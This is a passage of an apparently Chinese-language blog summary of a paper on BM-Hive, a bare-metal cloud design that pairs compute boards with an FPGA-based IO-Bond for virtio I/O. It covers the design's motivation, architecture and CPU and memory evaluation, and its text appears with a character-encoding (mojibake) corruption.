·è¦è™šæ‹ŸåŒ– CPU æˆ–å†…å­˜ï¼Œè€Œæ˜¯æ¯ä¸ª <code>bm-guest</code> éƒ½è¿è¡Œåœ¨å„è‡ªçš„è®¡ç®—æ¿ä¸Šï¼ˆç”±ä¸“æœ‰å¤„ç†å™¨ã€å†…å­˜å•å…ƒã€PCIe æ¥å£ç»„æˆï¼‰ï¼› <code>IO-Bond</code> ä½œä¸ºç¡¬ä»¶çš„ä¸€éƒ¨åˆ†ç”± FPGA è¿›è¡Œå®ç°ä»¥ç”¨äºåœ¨ä¸»æ¿ä¸è®¡ç®—æ¿é—´é€šä¿¡ï¼Œå…¶ä¸€æ–¹é¢æ¨¡æ‹Ÿ I&#x2F;O è®¾å¤‡ï¼ˆä¾‹å¦‚ virtio ç½‘ç»œä¸å—è®¾å¤‡ï¼‰ï¼Œå¦ä¸€æ–¹é¢å°†è®¡ç®—æ¿ä¸ä¸»æ¿çš„ PCIe æ€»çº¿è¿æ¥å¹¶è½¬å‘  <code>bm-guest</code> çš„ I&#x2F;O è¯·æ±‚åˆ°  <code>bm-hypervisor</code> </p><p> <code>BM-Hive</code> çš„è®¾è®¡å……åˆ†è§£å†³äº†å•ç§Ÿæˆ·è£¸é‡‘å±æœåŠ¡çš„é™åˆ¶ï¼Œ <strong>é¦–å…ˆ</strong> ï¼Œ <code>BM-Hive</code> å¯ä»¥åœ¨ä¸€ä¸ª  <code>BM-Hive</code> æœåŠ¡å™¨ä¸Šæ”¯æŒ 16 ä¸ª <code>bm-guest</code> ï¼Œæå‡æœåŠ¡å¯†åº¦çš„åŒæ—¶é™ä½å¼€é”€ï¼Œ <strong>å…¶æ¬¡</strong> ï¼Œ<code>bm-guest</code> å¯ä»¥ä½¿ç”¨ä»»ä½•è®¡ç®—æ¿æ‰€æ”¯æŒçš„ CPU, <strong>æœ€å</strong> ï¼Œ <code>BM-Hive</code> å¯ä»¥æ— ç¼èåˆåˆ°ç°æœ‰äº‘åŸºç¡€æ¶æ„ä¸­ï¼›æœ€ä¸»è¦çš„åŒºåˆ«æ˜¯ <code>vm-guest</code> è¿è¡Œåœ¨è™šæ‹Ÿ CPU ä¸Šï¼Œè€Œ <code>bm-guest</code> è¿è¡Œåœ¨è®¡ç®—æ¿ä¸Šï¼Œè€Œè¿™å¯¹äº‘åŸºç¡€æ¶æ„è€Œè¨€æ˜¯æ— æ„ŸçŸ¥çš„ï¼ˆå½’åŠŸäº <code>bm-hypervisor</code> ä¸ <code>IO-Bond</code> ï¼‰ï¼Œè¡¨ 1 å¯¹æ¯”äº†ä¸‰ç§ç±»å‹äº‘æœåŠ¡çš„ä¸åŒå±‚ï¼›æ­¤å¤– <code>bm-guest</code> æ— æ³•å®Œå…¨æ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨ï¼Œ <code>bm-hypervisor</code> é€šè¿‡ PCIe æ¥å£æ§åˆ¶å…¶æ‰§è¡Œï¼Œä¸” <code>IO-Bond</code> åœ¨ç¡¬ä»¶ä¸­å¼ºåˆ¶å¯¹ <code>bm-guest</code> è¿›è¡Œé€‚å½“éš”ç¦»</p><p><img src="https://s2.loli.net/2024/07/25/xhGA7yFgsMUo1c4.png" alt="Table 1. Comparison of three cloud services"></p><p>ä½œè€…åœ¨æœ€å¤§çš„ IaaS å…¬æœ‰äº‘æ•°æ®ä¸­å¿ƒä¹‹ä¸€éƒ¨ç½²äº† <code>BM-Hive</code> ï¼Œå¹¶å½»åº•åˆ†æäº†å…¶å®‰å…¨æ€§ä¸æ€§èƒ½è¡¨ç°ï¼Œå…¶å®éªŒå±•ç¤ºäº† <code>BM-Hive</code> çš„å¼ºéš”ç¦»ã€å®‰å…¨ä¸æ€§èƒ½</p><p>æ€»è€Œè¨€ä¹‹ï¼Œæœ¬æ–‡è´¡çŒ®å¦‚ä¸‹ï¼š</p><ul><li>ä½œè€…æå‡ºæ¥æ–°çš„è£¸é‡‘å±äº‘è®¾è®¡ï¼Œç»“åˆäº†ç°æœ‰åŸºäº VM çš„ä¸å•ç§Ÿæˆ·è£¸é‡‘å±çš„æœåŠ¡å™¨çš„ä¼˜ç‚¹ï¼Œå¹¶æä¾›å®‰å…¨ã€çµæ´»ã€å¯æ“ä½œçš„è£¸é‡‘å±äº‘æœåŠ¡</li><li><code>BM-Hive</code> æœ‰è½¯ç¡¬ä»¶ç»“åˆçš„ virtio ç³»ç»Ÿï¼Œè®© guests å¯ä»¥ç›´æ¥ä¸ç°æœ‰äº‘åŸºç¡€æ¶æ„ç»“åˆï¼Œç›´æ¥è·å¾—äº‘æœåŠ¡çš„å¯ç”¨æ€§ä¸å¼¹æ€§</li><li>ä½œè€…åŸºäº <code>BM-Hive</code> çš„è®¾è®¡æ„å»ºäº†ä¸€ä¸ªäº§å“çº§çš„ç³»ç»Ÿå¹¶åœ¨çœŸå®çš„äº‘ä¸­éƒ¨ç½²ï¼Œè¯æ˜äº† <code>BM-Hive</code> çš„å¯è¡Œæ€§</li><li>ä½œè€…åœ¨æœ€å¤§çš„å…¬æœ‰äº‘åŸºç¡€è®¾æ–½ä¹‹ä¸€éƒ¨ç½²äº† <code>BM-Hive</code> å¹¶å……åˆ†æµ‹é‡å…¶æ€§èƒ½ï¼Œè¯æ˜äº†å…¶ç›¸å¯¹åŸºäº VM çš„äº‘æœåŠ¡çš„ä¼˜ç‚¹</li></ul><h1 id="0x02-Background-and-Motivation"><a href="#0x02-Background-and-Motivation" class="headerlink" title="0x02. Background and Motivation"></a>0x02. Background and Motivation</h1><p><strong>Background</strong> ï¼šè™šæ‹ŸåŒ–æ˜¯ä¼ ç»Ÿäº‘çš„å…³é”®æŠ€æœ¯ï¼Œä¸»è¦æœ‰ CPUã€å†…å­˜ã€I&#x2F;O ä¸‰ä¸ªå±‚é¢ï¼ŒCPU ä¸ å†…å­˜è™šæ‹ŸåŒ–ç”±å¤„ç†å™¨æä¾›ï¼Œäº‘ä¸Š I&#x2F;O åˆ™é€šå¸¸æ˜¯åŠè™šæ‹ŸåŒ–ï¼ŒGuestä¾§å†…æ ¸ç›´æ¥è¯·æ±‚ä¸å¤„ç†é«˜çº§ I&#x2F;O æ“ä½œï¼Œè€Œéæ¨¡æ‹Ÿä½çº§ I&#x2F;O æ“ä½œï¼ˆå¦‚å¯„å­˜å™¨è®¿é—®ï¼‰ï¼Œæˆ–æ˜¯ç›´æ¥ç¡¬ä»¶è®¾å¤‡ç›´é€š</p><h2 id="2-1-Impact-on-Performance"><a href="#2-1-Impact-on-Performance" class="headerlink" title="2.1 Impact on Performance"></a>2.1 Impact on Performance</h2><p><strong>Performance overhead</strong> ï¼šè®¸å¤šäº‹ä»¶éƒ½èƒ½äº§ç”Ÿ VM exits è€Œé€ æˆå¤§é‡å¼€é”€ï¼ˆå•ä¸ª exit äº‹ä»¶è‡³å°‘ 10 Âµs çš„æƒ…å†µä¸‹ï¼Œæ¯ç§’ 5000+ æ¬¡ VM exit å°†æ˜¯ä¸å¯å¿½è§†çš„å¼€é”€ï¼‰ï¼Œè¡¨ 2 å±•ç¤ºäº†åœ¨ä½œè€…çš„äº‘æ•°æ®ä¸­å¿ƒä¸Š 5 min å†…çš„ 300000 ä¸ª VM çš„ç»Ÿè®¡æƒ…å†µ</p><p><img src="https://s2.loli.net/2024/07/25/yPx3XfA87FgMTdZ.png" alt="Table 2. Number of VM exits per second per vCPU"></p><p>å³ä¾¿æ˜¯ Guest ç›´æ¥è®¿é—®ç¡¬ä»¶çš„è®¾å¤‡ç›´é€šä¹Ÿä¼šæœ‰å¼€é”€ï¼ŒåŸºäº IOMMU çš„å®ç°å¯ä»¥å¢åŠ  60% çš„ç½‘å¡åœ¨ CPU ä¸Šä½¿ç”¨ï¼ˆä½†ååé‡ä¸å˜ï¼‰</p><p>æ­¤å¤–è¿˜æœ‰å…¶ä»–ä¼šå¢åŠ æ€§èƒ½å¼€é”€çš„å±‚é¢ï¼ˆå¦‚ vCPU é”ã€TLBç­‰ï¼‰ï¼Œä½†è¿™äº›åœ¨ <code>BM-Hive</code> æœåŠ¡å™¨ä¸­éƒ½æ²¡æœ‰</p><p><strong>Performance variation</strong> ï¼šå…±äº«èµ„æºçš„å†²çªåŒæ ·å¸¦æ¥æ€§èƒ½å½±å“ï¼Œå¦‚ I&#x2F;O å¤„ç†é«˜å³°æœŸ host OS å¯èƒ½æŠ¢å  guest VM æ‰§è¡Œè€Œé€ æˆæ€§èƒ½å¼€é”€ä¸æ³¢åŠ¨</p><p>å›¾ 1 å±•ç¤ºäº†ä½œè€…çš„æ•°æ®ä¸­å¿ƒåœ¨ 24 å°æ—¶å†…çš„ 20000 VM ç”±ä½åˆ°é«˜çš„è¢« hypervisor æŠ¢å ç‡ï¼ˆshared è¡¨ç¤ºæœªä¸ç‰©ç†æ ¸å¿ƒç»‘å®šï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µä¸‹æ²¡æœ‰ VM ä¸»åŠ¨å°è¯•å æœ‰èµ„æºï¼ˆå¦åˆ™ä¼šæ›´ç³Ÿï¼‰</p><p><img src="https://s2.loli.net/2024/07/25/Oe3Li9aIoykAs7Z.png" alt="Figure 1. VM preemption of the 99th and 99.9th percentile. The y-axis shows the percent of the CPU time used by the hypervisor/the host OS."></p><h2 id="2-2-Security-Concerns"><a href="#2-2-Security-Concerns" class="headerlink" title="2.2 Security Concerns"></a>2.2 Security Concerns</h2><p>VM é—´ç¡¬ä»¶èµ„æºå…±äº«å¯èƒ½å¯¼è‡´ä¾§ä¿¡é“æ”»å‡»ï¼ˆå¦‚ Meltdownã€Spectreã€L1TF ç­‰ï¼‰ï¼Œä½†åœ¨ <code>bm-guest</code> ç‰©ç†éš”ç¦»çš„ <code>BM-Hive</code> ä¸Šä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜</p><p>hypervisor æ¼æ´æ˜¯äº‘ä¸Šä¸»è¦æ”»å‡»é¢ï¼Œä½† <code>bm-hypervisor</code> æ— éœ€ CPU&#x2F;å†…å­˜ è™šæ‹ŸåŒ–ä¸”ä¸èƒ½ä» guests ä¾§ç›´æ¥è®¿é—®</p><blockquote><p>ç¬”è€…æ³¨ï¼šè¿™ä¸€å—å®é™…ä¸Šç¬”è€…æ„Ÿè§‰ä¸æ˜¯å¾ˆå½³äºï¼Œå› ä¸ºæ¨¡æ‹Ÿè®¾å¤‡åœ¨ DPU ä¸Šæ¨¡æ‹Ÿï¼ˆé€šå¸¸ç”± QEMU å®ç°ï¼‰åŒæ ·ä¼šæœ‰æ¼æ´ï¼Œå¯¹äºæ”»å‡»è€…è€Œè¨€ä¼¼ä¹åªæ˜¯æ”»å‡»çš„ä½ç½®å˜äº†</p></blockquote><h2 id="2-3-Nested-Hypervisor"><a href="#2-3-Nested-Hypervisor" class="headerlink" title="2.3 Nested Hypervisor"></a>2.3 Nested Hypervisor</h2><p>ä¼ ç»Ÿäº‘ç”¨æˆ·æƒ³è¦å†è·‘è™šæ‹Ÿæœºåªèƒ½ä¾èµ–åµŒå¥—è™šæ‹ŸåŒ–ï¼Œè¿™å¢å¤§äº† hypervisor è®¾è®¡å¤æ‚åº¦ä¸æ€§èƒ½å¼€é”€</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="3-1-Design-Requirements"><a href="#3-1-Design-Requirements" class="headerlink" title="3.1 Design Requirements"></a>3.1 Design Requirements</h2><p><code>BM-Hive</code> è®¾è®¡è¦æ±‚å¦‚ä¸‹ï¼š</p><ul><li><p><strong>Multi-tenancy</strong> ï¼š <code>BM-Hive</code> å¿…é¡»æ”¯æŒå¤šç§Ÿæˆ·å…±äº«åŒä¸€ç‰©ç†æœåŠ¡å™¨ä»¥å®ç°ç»†ç²’åº¦ CPU æ ¸å¿ƒ</p></li><li><p><strong>Security</strong> ï¼š <code>BM-Hive</code> å¿…é¡»æä¾›åŸºäºç¡¬ä»¶çš„ <code>bm-guests</code> é—´å¼ºéš”ç¦»</p></li><li><p><strong>Interoperability</strong> ï¼š  <code>BM-Hive</code> å¿…é¡»ä¸ç°æœ‰äº‘åŸºç¡€æ¶æ„å…¼å®¹ä»¥è·å–å·²æœ‰çš„å¯ç”¨æ€§ã€ä¾èµ–æ€§ã€å¼¹æ€§ï¼Œäº’é€šæ€§ï¼ˆinteroperabilityï¼‰è¦æ±‚ <code>bm-guest</code> åŒæ ·èƒ½è¿è¡Œåœ¨ VM ä¸­ï¼Œè¿™ä¸ªç‰¹æ€§ç§°ä¸º <code>cold migration</code> ï¼Œå…¶ä¸€ä¸ªä¾èµ–é¡¹ä¾¿æ˜¯ <code>bm-guest</code> å¿…é¡»èƒ½å¤Ÿä¸äº‘å­˜å‚¨ä¸ç½‘ç»œè¿›è¡Œé«˜æ€§èƒ½è¿æ¥ï¼ˆç”± virtio è¿™æ ·çš„åŠè™šæ‹ŸåŒ–æ”¯æŒï¼‰ï¼Œ <code>BM-Hive</code> é€šè¿‡ç‰¹åˆ¶çš„è½¯ç¡¬ä»¶æ··åˆ virtio å®ç°</p></li><li><p><strong>Performance</strong> ï¼š <code>bm-guest</code> åº”å½“æœ‰åŸç”Ÿ CPU&#x2F;å†…å­˜æ€§èƒ½ä¸è¿‘åŸç”Ÿ IO æ€§èƒ½ä»¥åŠæœ€å°çš„æ€§èƒ½æ³¢åŠ¨</p></li><li><p><strong>Cost efficiency</strong> ï¼š<code>bm-guest </code>åœ¨åŒé…ç½®ä¸‹ å¼€é”€åº”æ¯” <code>vm-guest</code> å°</p></li></ul><h2 id="3-2-System-Overview"><a href="#3-2-System-Overview" class="headerlink" title="3.2 System Overview"></a>3.2 System Overview</h2><p>å›¾ 2 å¯¹æ¯”äº†è™šæ‹ŸåŒ–æ¶æ„ä¸ <code>BM-Hive</code> çš„åŒºåˆ«ï¼Œä¸»è¦åŒºåˆ«æ˜¯ <code>vm-guest</code> è¿è¡Œåœ¨è™šæ‹ŸåŒ– CPU ä¸å†…å­˜ä¸Šè€Œ <code>bm-guest</code> è¿è¡Œåœ¨ç‰©ç† CPU ä¸å†…å­˜ä¸Šï¼Œ<code>bm-hypervisor</code> æ˜¯ç±»ä¼¼ <code>vm-hypervisor</code> çš„ç”¨æˆ·æ€ç¨‹åºï¼Œç®¡ç† <code>vm-guest</code> ç”Ÿå‘½å‘¨æœŸã€æä¾› virtio è®¾å¤‡ã€ä¸äº‘åŸºç¡€æ¶æ„äº¤äº’ç­‰ï¼Œå…¶ä¸éœ€è¦è™šæ‹ŸåŒ–å› è€Œä»£ç æ¯” <code>vm-hypervisor</code> ç®€å•å¾—å¤šï¼Œ<code>bm-hypervisor</code> è¿›ç¨‹ä¸ <code>bm-guest</code> é—´ä¸€ä¸€å¯¹åº”ä¸”åªèƒ½é€šè¿‡ virtio äº¤äº’</p><p><img src="https://s2.loli.net/2024/07/25/ACfzumlg1c6UDhI.png" alt="Figure 2. Architecture of BM-Hive, compared to KVM"></p><p><strong>Use scenario</strong> ï¼šäº‘åŸºç¡€æ¶æ„é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„è£¸é‡‘å±æœåŠ¡å™¨å¹¶é€‰æ‹©ä¸€ä¸ªç©ºé—²è®¡ç®—å¡å¯åŠ¨ï¼ˆé€šè¿‡å¼€å¯ PCIe powerï¼‰ï¼Œæ¿ä¸Šå›ºä»¶å¼€å§‹æ‰§è¡Œ boot loader å¹¶éšååŠ è½½ <code>bm-guest</code> å†…æ ¸ï¼Œäº‘ä¸Šç»å¤§éƒ¨åˆ† guests æ— æ³•ä½¿ç”¨æœ¬åœ°å­˜å‚¨ï¼Œå› æ­¤ bootloader ä¸å†…æ ¸é€šè¿‡ virtio-blk è·å–ï¼Œä½œè€…é€šè¿‡æ‰©å±• EFI å›ºä»¶ä»¥å®ç°è¿™ä¸€ç‚¹</p><h2 id="3-3-System-Architecture"><a href="#3-3-System-Architecture" class="headerlink" title="3.3 System Architecture"></a>3.3 System Architecture</h2><p>å›¾ 3 å±•ç¤ºäº† <code>BM-Hive</code> çš„ç³»ç»Ÿæ¶æ„ï¼Œæ¯ä¸ªè£¸é‡‘å±æœåŠ¡å™¨ç”±ç®€åŒ–çš„ Xeon æœåŠ¡å™¨ï¼ˆ<code>base</code> ï¼‰ä¸ä¸€ç»„è®¡ç®—å¡ï¼ˆç”± CPUã€å†…å­˜ã€PCIe æ€»çº¿ã€FPGA æ„å»ºçš„ IO-Bond ç»„æˆçš„ PCIe å¡ï¼‰ç»„æˆï¼Œåœ¨ <code>bm-guest</code> è§†è§’ç”±è®¡ç®—å¡æ¨¡æ‹Ÿçš„ virtio è®¾å¤‡æ˜¯å¸¸è§„çš„ PCIe è®¾å¤‡ï¼ŒIO-Bond ä½œä¸º <code>bm-guest</code> ä¸­çš„ virtio å‰ç«¯ä¸ <code>bm-hypervisor</code> ä¸­çš„ virtio åç«¯é—´çš„æ¡¥æ¢ï¼Œå¹¶é€šè¿‡å†…ç½®çš„ DMA å¼•æ“è¿›è¡Œå‘½ä»¤ä¸æ•°æ®çš„è½¬å‘ï¼›IO-Bond ç›®å‰æ”¯æŒ virtio ç½‘ç»œä¸å­˜å‚¨è®¾å¤‡ï¼Œä¸”å¯ä»¥è½»æ˜“æ‰©å±•ï¼Œæ­¤å¤–å…¶å¯ä»¥ç”± ASIC èŠ¯ç‰‡å®ç°</p><p><img src="https://s2.loli.net/2024/07/25/bEaomMIZGgAkjX8.png" alt="Figure 3. System architecture of BM-Hive"></p><p>åœ¨ <code>bm-hypervisor</code> çš„è§’åº¦æ¯ä¸ªè®¡ç®—å¡ä¾¿æ˜¯ä¸€ä¸ª PCIe çš„ <code>bm-guest</code> è®¾å¤‡ï¼Œä¸€ä¸ª <code>base</code> æœåŠ¡å™¨å¯ä»¥æ”¯æ’‘ 16 å¼ è®¡ç®—å¡ï¼Œ<code>bm-hypervisor</code> çš„åŠŸèƒ½ä¸»è¦æœ‰ï¼š1ï¸âƒ£ ç®¡ç† <code>bm-guest</code> ç”Ÿå‘½å‘¨æœŸä¸è®¡ç®—å¡åˆ†é… 2ï¸âƒ£ æä¾›å¹¶ç»´æŠ¤ virtio è®¾å¤‡åç«¯ 3ï¸âƒ£ ä¸ç°æœ‰äº‘åŸºç¡€æ¶æ„å¯¹æ¥</p><h2 id="3-4-IO-Bond"><a href="#3-4-IO-Bond" class="headerlink" title="3.4 IO-Bond"></a>3.4 IO-Bond</h2><p>IO-Bond ç”¨äºå……å½“è®¡ç®—å¡ä¸Š virtio è®¾å¤‡çš„ä»£ç†</p><p><strong>3.4.1 IO-Bond: Frontend.</strong>  IO-Bond å‰ç«¯è¿æ¥åˆ°è®¡ç®—æ¿çš„ PCIe æ€»çº¿ï¼Œå…¶ FPGA æ¨¡æ‹Ÿäº† PCI æ¥å£ä¾› <code>bm-guest</code> ä½¿ç”¨ï¼Œå¹¶å°† <code>bm-guest</code> è®¿é—®è½¬å‘åˆ°åç«¯</p><p><code>BM-Hive</code> æ— æ³•ç›´æ¥ä½¿ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿçš„å…±äº«ç¯ç¼“å†²åŒºè®¾è®¡ï¼ˆIO-Bond å‰åç«¯ç‰©ç†å†…å­˜ä¸å…±äº«ï¼‰ï¼Œå› æ­¤ç”± IO-Bond ä¸º <code>bm-hypervisor</code> ä¸ <code>bm-guest</code> æä¾›ç¯ç¼“å†²åŒºï¼Œå¹¶å°† <code>bm-hypervisor</code> çš„ç¯ç¼“å†²åŒºä¸å…¶ä»–è¿›è¡ŒåŒæ­¥ï¼ˆå¦‚å›¾ 4 æ‰€ç¤ºï¼‰ï¼Œåœ¨ä¸€ä¸ªç¼“å†²åŒºè¢«æ·»åŠ ä¸Šæ•°æ®å IO-Bond çš„ DMA å¼•æ“ä¾¿ä¼šæ‹·è´åˆ°å…¶ä»–ç¼“å†²åŒº</p><p><img src="https://s2.loli.net/2024/07/25/MNbjS7ifZ1ETYF3.png" alt="Figure 4. Shadow ring buffers in BM-Hive"></p><p><strong>3.4.2 IO-Bond: Backend.</strong> IO-Bond åç«¯å°†è¯·æ±‚è½¬å‘åˆ°å¯¹åº”äº‘è®¾å¤‡ï¼Œå…¶è®¾è®¡ä¸»è¦å…³æ³¨ä¸äº‘åŸºç¡€æ¶æ„é—´çš„é«˜æ€§èƒ½ I&#x2F;Oï¼Œåœ¨ <code>BM-Hive</code> ä¸­æ‰€æœ‰ I&#x2F;O è¯·æ±‚é€šè¿‡ vhost-user åè®®ä¸äº‘åŸºç¡€æ¶æ„ï¼ˆä¿®æ”¹ç‰ˆ DPDK vSwitch å’Œ SPDK äº‘å­˜å‚¨ï¼Œä½¿ç”¨ poll mode driver è€Œéä¸­æ–­ï¼‰äº¤äº’ï¼Œç”±æ­¤æ‰€æœ‰è¯·æ±‚åœ¨ç”¨æˆ·ç©ºé—´å®Œæˆå¤„ç†ï¼Œé¿å…é¢å¤–çš„å†…æ ¸ä¸ç”¨æˆ·æ€é—´å†…å­˜æ‹·è´ï¼›æ­¤å¤– <code>BM-Hive</code> æ”¯æŒ VGA è®¾å¤‡ä»¥è¿æ¥ <code>bm-guest</code> æ§åˆ¶å°</p><p><img src="https://s2.loli.net/2024/07/25/BR9A5OYKZgHCSUj.png" alt="Figure 5. Backend of BM-Hive"></p><p><strong>3.4.3 IO-Bond Implementation.</strong> æ¯ä¸ª virtio è®¾å¤‡çš„æ¯ä¸ª virtio é˜Ÿåˆ—éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„åç«¯ shadow vringï¼ˆIO-Bond ä¸ <code>bm-hypervisor</code> é—´çš„å…±äº«ç¼“å†²åŒºï¼Œæ‰€æœ‰ shadow vring è¢«ç»„ç»‡ä¸ºä¸€ä¸ªç¼“å†²åŒºæè¿°ç¬¦åˆ—è¡¨å¹¶æ˜ å°„åˆ° IO-Bond ä¸­ï¼‰ï¼Œ <code>bm-hypervisor</code> ä¸ IO-Bond é—´é€šè¿‡ä¸€å¯¹ mailbox å¯„å­˜å™¨ä¼ é€’ PCI è®¿é—®æé†’ï¼Œä¸”æ¯ä¸ª shadow vring éƒ½æœ‰ä¸€å¯¹ head&#x2F;tail å¯„å­˜å™¨</p><p>å›¾ 6 å±•ç¤ºäº† IO-Bond å¦‚ä½•å“åº” guests çš„ä¸€ä¸ªä¼ ç»Ÿçš„ virtio Tx&#x2F;Rx å·¥ä½œæµï¼Œ<code>bm-guest</code> å†™å…¥ virtio å¯„å­˜å™¨ä»¥é€šçŸ¥ IO-Bond ã€å¹¶åœ¨ Rx æ•°æ®åˆ°è¾¾æ—¶è·å¾— MSI ä¸­æ–­ï¼›<code>bm-hypervisor</code> ä¸­æœ‰ä¸€ä¸ªä¸“æœ‰çº¿ç¨‹æ‹‰å– IO mailbox ä¸ shadow vring head&#x2F;tail å¯„å­˜å™¨ä»¥é¿å…ä¸­æ–­ï¼Œå›¾ä¸­ 1 ï½ 6 ä¸ºæ ‡å‡† virtio æ“ä½œï¼›æœ€ç»ˆ IO-Bond é€šè¿‡æ›´æ–° head å¯„å­˜å™¨é€šçŸ¥ <code>bm-hypervisor</code> ï¼Œæ”¶åˆ°çš„ Rx ç¼“å†²åŒºè¢«ä¿ç•™</p><p><img src="https://s2.loli.net/2024/07/25/QYZm57sTAGkjb1x.png" alt="Figure 6. Tx/Rx example of IO-Bond"></p><p>å¾—ç›Šäº IO-Bond ä¸­ FPGA çš„ä½å¼€é”€ï¼Œ<code>bm-guest</code> åˆ° IO-Bond çš„ PCI è¯»å†™æ“ä½œä»…éœ€è¦ 0.8 Âµsï¼ŒIO-Bond åˆ° mailbox å¯„å­˜å™¨åˆè¦ 0.8 Âµsï¼Œå•æ¬¡è®¿é—®æ€»å¼€é”€ä»… 1.6 Âµsï¼›IO-Bond ä¸ºæ¯ä¸ª virtio ç½‘ç»œ&#x2F;å­˜å‚¨è®¾å¤‡æš´éœ²ä¸€ä¸ª PCIe x4 æ¥å£ï¼Œé€šè¿‡ PCIe x8 æ¥å£å¤‡ä»½åˆ° <code>bm-hypervisor</code> ï¼ŒIO-Bond å†…éƒ¨ DMA ååé‡ä¸º 50Gbpsï¼ˆæ¯ä¸ª x4 æ¥å£ä¸º 32 Gbpsï¼‰ï¼Œé€šè¿‡æœåŠ¡å™¨å…±äº«ç½‘ç»œæ¥å£ï¼ˆ100 Gbpsï¼‰ è½¬å‘åˆ°äº‘æœåŠ¡ï¼Œä¸” <code>bm-guest</code> é—´è´·æ¬¾æ¶ˆè€—ä¼šåŠ¨æ€å¹³è¡¡ä»¥ä¿æŒå…¬å¹³</p><h2 id="3-5-Costs-efficiency"><a href="#3-5-Costs-efficiency" class="headerlink" title="3.5 Costs efficiency"></a>3.5 Costs efficiency</h2><p>æ•°æ®ä¸­å¿ƒçš„ç›ˆåˆ©èƒ½åŠ›å–å†³äº vCPU å¯†åº¦ï¼Œä¼ ç»Ÿçš„åŸºäº VM çš„æœåŠ¡å™¨éœ€è¦ä¸º hypervisor ä¸ host OS ä¿ç•™ CPU æ ¸å¿ƒï¼Œè€Œ <code>BM-Hive</code> å…·æœ‰æ›´é«˜çš„ vCPU æˆæœ¬æ•ˆç›Šï¼ˆè™½ç„¶éœ€è¦é¢å¤–çš„ CPU ä¸ FPGA æ”¯å‡ºï¼‰</p><p>èƒ½è€—ä¹Ÿæ˜¯æˆæœ¬æ•ˆç‡çš„ä¸€ä¸ªç‚¹ï¼Œä½† <code>BM-Hive</code> ä¸ä¼ ç»Ÿ VM æœåŠ¡å™¨æä¾›çš„ vCPU ä¸åŒï¼Œå› æ­¤å¾ˆéš¾æ¯”è¾ƒ</p><h1 id="0x04-Evaluation"><a href="#0x04-Evaluation" class="headerlink" title="0x04. Evaluation"></a>0x04. Evaluation</h1><h2 id="4-1-Environment-Setup"><a href="#4-1-Environment-Setup" class="headerlink" title="4.1 Environment Setup"></a>4.1 Environment Setup</h2><p>è¡¨ 3 å±•ç¤ºäº†ä½œè€…éƒ¨ç½² <code>BM-Hive</code> çš„å…¬æœ‰äº‘ä¸Šçš„å®ä¾‹é…ç½®ï¼Œæ³¨æ„ä¸€ä¸ªäº‘å®ä¾‹çš„ I&#x2F;O æ€§èƒ½é€šå¸¸è¢«é™é€Ÿä»¥é¢„é˜²èµ„æºè¯¯ç”¨å’Œæå‡æ•´ä½“æœåŠ¡è´¨é‡</p><p><img src="https://s2.loli.net/2024/07/26/kXH73A6xrRhWcwI.png" alt="Table 3. Bare-metal instances available in our cloud. The last column shows the maximum number of the compute boards in a single BM-Hive server. This number depends on the serverâ€™s power supply, internal space, and I/O performance."></p><h2 id="4-2-CPU-and-Memory-Performance"><a href="#4-2-CPU-and-Memory-Performance" class="headerlink" title="4.2 CPU and Memory Performance"></a>4.2 CPU and Memory Performance</h2><p>æ‰€æœ‰å®éªŒåœ¨å¸¦æœ‰ç›¸åŒçš„åŸºäº CentOS çš„ç³»ç»Ÿçš„ Xeon E5-2682 v4 å®ä¾‹ä¸Šå®Œæˆï¼Œä½œè€…å¯¹æ¯”äº† <code>BM-Hive</code> ä¸ VM ä»¥åŠç‰©ç†æœºï¼ˆå¯è¡Œæ—¶ï¼‰çš„æ€§èƒ½ï¼Œ<code>vm-guest</code> ä¸ <code>bm-guest</code> éƒ½è¿è¡Œåœ¨ 64G å†…å­˜çš„ Xeon E5-2682 v4 CPU ä¸Šï¼Œ<code>vm-guest</code> ç‹¬å å®ä¾‹ä¸”å›ºå®šåˆ°æœ‰ NMUA èŠ‚ç‚¹äº²å’ŒåŠ›çš„ç‰©ç† CPU æ ¸å¿ƒä¸Š</p><p>ä½œè€…å°† <code>BM-Hive</code> ä¸ <code>vm-guest</code> ä¸ç‰©ç†æœºå™¨çš„æ€§èƒ½è¿›è¡Œæ¯”è¾ƒï¼Œå†…æ ¸ç‰ˆæœ¬ä¸º <code>3.10.0-514.26.2.el7</code> ï¼Œä½†ç‰©ç†æœºæœ‰ 2 ä¸ª CPU æ’æ§½ä¸ 384G å†…å­˜ï¼Œå›¾ 7 ä¸ 8 å±•ç¤ºäº† SPEC CINT 2006 ä¸ STREAM çš„å¤šæ¬¡æµ‹è¯•ç»“æœ</p><p><img src="https://s2.loli.net/2024/07/26/zp1CjeF8Tn2BvNK.png" alt="Figure 7. CPU performance by SPEC CPU2006 Figure 8. Memory bandwidth by STREAM multi-thread"></p><p>CPU çš„æµ‹è¯•ç»“æœç›¸è¿‘ï¼Œ<code>BM-Hive</code> æ¯”ç‰©ç†æœºå¿« 4%ï¼ŒVM æ¯”ç‰©ç†æœºæ…¢ 4% ï¼Œæ³¨æ„åˆ° <code>bm-guest</code> ä¸ç‰©ç†æœºæ€§èƒ½å¹¶ä¸å®Œå…¨ç›¸åŒï¼ˆå› ä¸ºé…ç½®ä¸è®¾è®¡ä¸åŒï¼‰ï¼Œ <code>vm-guest</code> åˆ™å› ä¸ºè™šæ‹ŸåŒ–çš„ç¼˜æ•…å­˜åœ¨å¼€é”€</p><p><code>BM-HIve</code> åœ¨å†…å­˜ä¸ŠåŒæ ·å ä¼˜ï¼Œå¦‚å›¾ 8 æ‰€ç¤º<code>BM-HIve</code> å‡ ä¹ä¸ç‰©ç†æœºå®Œå…¨ç›¸åŒï¼Œä½† <code>vm-guest</code> ç”±äºè™šæ‹ŸåŒ–å¼€é”€æœ€å¤šåªæœ‰ <code>bm-guest</code> 98% çš„æ€§èƒ½</p><p><strong>Summary</strong> ï¼šåŒé…ç½® <code>bm-guest</code>æ¯”  <code>vm-guest</code> æœ‰æ›´å¥½çš„ CPU ä¸å†…å­˜æ€§èƒ½ï¼Œä¸” <code>BM-HIve</code> å¯ä»¥åˆ©ç”¨å•çº¿ç¨‹æ€§èƒ½æ›´é«˜çš„ CPU</p><h2 